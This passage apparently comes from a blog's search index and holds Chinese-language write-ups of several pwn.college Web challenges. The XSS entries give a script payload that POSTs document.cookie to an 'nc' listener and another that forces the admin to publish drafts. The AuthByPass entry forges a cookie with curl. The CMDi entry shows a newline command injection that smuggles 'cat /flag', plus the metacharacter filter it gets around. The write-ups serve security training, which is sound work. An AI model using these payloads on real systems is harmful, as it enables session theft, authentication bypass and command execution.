password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br>    response.set_cookie(<span class="hljs-string">&quot;auth&quot;</span>, username + <span class="hljs-string">&quot;|&quot;</span> + password)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>由于flask默认不开启httponly，因此可以结合XSS漏洞，通过Javascript的document.cookie属性获取cookie</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根据上述分析，首先要完成XSS注入，之后诱导admin用户访问网页，此时网页会执行注入的js代码，将cookie发到攻击者的服务器<br><br>具体步骤如下：<br><br>首先以guest身份登录，在发帖区填入恶意payload<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://localhost:12345&quot;</span>,&#123;<span class="hljs-attr">method</span>:<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-attr">body</span>:<span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)&#125;)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>点击提交后，开启接收cookie的服务，此题中在本地开放一个端口即可，尽量选择端口号大一些的，防止被已有进程占用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 12345<br></code></pre></td></tr></table></figure><p>之后运行challenge&#x2F;victim脚本，模拟受害者访问网页的步骤，此时即可在监听端口处看到返回的cookie：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/LeakToken.png"><br>cookie里包含着admin的口令（其实是flag的倒数20个字符），URL解码之后再次去浏览器以admin身份登录，可以看到其名下的草稿（即flag）<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS-7/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS-5</title>
    <link href="/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/"/>
    <url>/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>先看server端源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br>db.execute(<span class="hljs-string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/publish&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_publish</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> flask.session:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Log in first!&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_update.html</span><br>    db.execute(<span class="hljs-string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="hljs-string">&quot;username&quot;</span>)])<br>    <span class="hljs-keyword">return</span> flask.redirect(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过分析上述代码块，发现admin用户名下的帖子正是需要的flag，但初始是草稿状态，只能显示开头12个字符，因此需要想办法让admin把自己的贴子发布出去<br><br>同时注意到如果对应的用户访问了&#x2F;publish路由，就会直接将自己名下的草稿全部发出去，没有二次校验，因此想办法让admin访问注入后的页面，正好观察victim代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">challenge_url = <span class="hljs-string">&quot;http://challenge.localhost:80/&quot;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Visiting <span class="hljs-subst">&#123;challenge_url&#125;</span>&quot;</span>)<br>browser.get(challenge_url)<br><br>browser.find_element(By.NAME, <span class="hljs-string">&quot;username&quot;</span>).send_keys(<span class="hljs-string">&quot;admin&quot;</span>)<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;password&quot;</span>).send_keys(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read().strip())<br>browser.find_element(By.NAME, <span class="hljs-string">&quot;submit&quot;</span>).submit()<br></code></pre></td></tr></table></figure><p>可以发现该脚本正是需要的模拟admin登录，因此可以尝试注入js脚本达到欺骗admin把帖子发出去的目的</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>由于guest用户的口令是已知的，可以先以guest身份登录，发布包含恶意Javascript代码的帖子，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://challenge.localhost/publish&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后再运行victim脚本，最后刷新网页，可以观察到flag泄露<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS5-flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>AuthByPass-2</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge&#x2F;server开启一个用户登录的服务，接收POST请求和GET请求，POST请求要求输入用户名和口令，并去数据库校验；<br><br>GET请求读取传入的cookie值，如果session_user字段是admin就会回显flag到网页</p><span id="more"></span><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>阅读server脚本的源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_post</span>():<br>    username = flask.request.form.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    password = flask.request.form.get(<span class="hljs-string">&quot;password&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `username` form parameter&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Missing `password` form parameter&quot;</span>)<br><br>    <span class="hljs-comment"># https://www.sqlite.org/lang_select.html</span><br>    user = db.execute(<span class="hljs-string">&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password)).fetchone()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Invalid username or password&quot;</span>)<br><br>    response = flask.redirect(flask.request.path)<br>    response.set_cookie(<span class="hljs-string">&#x27;session_user&#x27;</span>, username)<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge_get</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (username := flask.request.cookies.get(<span class="hljs-string">&quot;session_user&quot;</span>, <span class="hljs-literal">None</span>)):<br>        page = <span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;Welcome to the login service! Please log in as admin to get the flag.&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        page = <span class="hljs-string">f&quot;&lt;html&gt;&lt;body&gt;Hello, <span class="hljs-subst">&#123;username&#125;</span>!&quot;</span><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span>:<br>            page += <span class="hljs-string">&quot;&lt;br&gt;Here is your flag: &quot;</span> + <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br></code></pre></td></tr></table></figure><p>发现服务端的身份验证是有漏洞的，因为当发起GET请求同时传入的cookie是admin的话，就不会再次校验admin的口令，因此首先以guest身份登录，并保存cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80&quot;</span> -X POST -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -c cookies.txt -d <span class="hljs-string">&quot;username=guest&amp;password=password&quot;</span><br></code></pre></td></tr></table></figure><p>去当前文件夹下把cookies.txt里的session_user字段改为admin<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/cookie.png"><br>修改完后向服务端再次发起请求，只不过这次是发送GET请求，并且携带该cookie</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80?&quot;</span> -H <span class="hljs-string">&quot;Host:challenge.localhost:80&quot;</span> -b cookies.txt<br></code></pre></td></tr></table></figure><p>最后得到包含flag的响应体<br><img src="/../../../../../../../photos/pwn.college/intro/Web/AuthByPass-2/flag.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CMDi-6</title>
    <link href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/"/>
    <url>/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/CMDi-6/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下面有一个python写的server脚本，运行它会在本机的80端口开放一个http服务。这个命令接收GET方法传参，并且以该参数执行ls命令<br><br>我们需要做的就是想办法在ls之后让服务器的shell再执行我们想要的命令，即连续执行</p><span id="more"></span><h1 id="漏洞点与难点分析"><a href="#漏洞点与难点分析" class="headerlink" title="漏洞点与难点分析"></a>漏洞点与难点分析</h1><p>首先观察server脚本的源代码：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">arg = (<br>        flask.request.args.get(<span class="hljs-string">&quot;subdirectory&quot;</span>, <span class="hljs-string">&quot;/challenge&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>        .replace(<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    )<br>    command = <span class="hljs-string">f&quot;ls -l <span class="hljs-subst">&#123;arg&#125;</span>&quot;</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;DEBUG: <span class="hljs-subst">&#123;command=&#125;</span>&quot;</span>)<br>    result = subprocess.run(<br>        command,  <span class="hljs-comment"># the command to run</span><br>        shell=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># use the shell to run this command</span><br>        stdout=subprocess.PIPE,  <span class="hljs-comment"># capture the standard output</span><br>        stderr=subprocess.STDOUT,  <span class="hljs-comment"># 2&gt;&amp;1</span><br>        encoding=<span class="hljs-string">&quot;latin&quot;</span>,  <span class="hljs-comment"># capture the resulting output as text</span><br>    ).stdout<br></code></pre></td></tr></table></figure><p>发现常见的命令连接符都被过滤了，但是仔细观察发现换行符是漏网之鱼，而在Linux中，换行符也可以起到连续执行命令的效果</p><h1 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h1><p>经过上述分析，直接使用curl工具完成漏洞利用：<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://challenge.localhost:80/trial?subdirectory=/challenge%0acat%20/flag&quot;</span><br></code></pre></td></tr></table></figure><p>成功得到包含flag的响应体：<br><br><img src="/../../../../../../../photos/pwn.college/intro/Web/CMDi-6.png"></p>]]></content>
    
    
    <categories>
      
      <category>pwn.college题解</category>
      
      <category>intro</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
